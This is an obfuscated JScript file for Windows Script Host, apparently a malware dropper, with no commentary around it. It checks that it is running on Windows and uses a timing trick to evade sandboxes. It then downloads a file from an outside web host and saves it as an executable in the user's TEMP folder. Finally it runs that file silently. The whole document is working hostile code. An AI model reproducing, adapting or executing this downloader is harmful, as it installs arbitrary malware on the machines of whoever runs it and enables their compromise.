var _X0 = false;
var _FO = "CreateObject";
var _FR = function _LX() {return WScript[_FO]("WScript"+".Shell");}(), _DB = 11;
var _IR = "MSXML2.XMLHTTP";
var _NY = 2123213;
var _XN = 0;
function _NW(_G){_FR["Run"](_G, _XN, _XN);};
function _E(){return _IR + "";};
function _N(_Z, _E0){_XN = _XN * 1; return _Z - _E0;};
function _S(){return _FO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _X0 = true;
  @end
@*/
if (_X0)
{
var _OY = "";
function _HX(){return 22;};
var _RA = 0; var _X = 0;
function _XL()
{
var _IT = new this["Date"]();
var _YL = _IT["getUTCMilliseconds"]();
WScript["Sleep"](_HX());
var _IT = new this["Date"]();
var _I = _IT["getUTCMilliseconds"]();
WScript["Sleep"](_HX());
var _IT = new this["Date"]();
var _P = _IT["getUTCMilliseconds"]();
var _RA = "_N0";
_RA = _N(_I, _YL);
var _X = "_IW";
_X = _N(_P, _I);
_OY = "open";
return _N(_RA, _X);
}
var _FO0 = false;
var _XP = false;
for (var _WY = _XN; _WY < _HX() * 1; _WY++){if (_XL() != _XN){
_FO0 = true; 
_X = "31" + 11 * _RA + _X; 
_XP = true; 
break;
}}
function _V() {return ((_FO0 == true) && (_FO0 == _XP)) ? 1 : _XN;};
if (_FO0 && _V() && _XP){
function _DP() {return _FR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zuagUngIu7arB.ex" + "e";};
 _QF = _E();
 _CO = WScript[_FO](_QF);
 var _QW = 1;
 while (_QW){
try {
	if (_QW == 1)
	{
		_CO[_OY]("GET", "http://mentalmathcompetition.com/k4isa", false);
		_CO["send"]();
		_NW0 = "Sleep";
	}
	WScript[_NW0](_HX() + 120); 
	if (_CO["readystate"] < 2 * 2) continue;
	_QW = _XN;
	function _Q(_MX) {var _N1 = (1, 2, 3, 4, 5, _MX); return _N1;};
	_AP = WScript[_S()]("ADODB.Stream");
	_QF = _AP;
	_QF[_OY]();
	_QF["type"] = _Q(1);
	_QF["write"](_CO["ResponseBody"]);
	_AP["position"] = _Q(_XN);
	_QF["Save" + "ToFile"](_DP(), 2);
	_AP["cl"+"ose"]();
	_LW = _DP();
	_NW(_LW);
} catch(_U){};
}
}
}

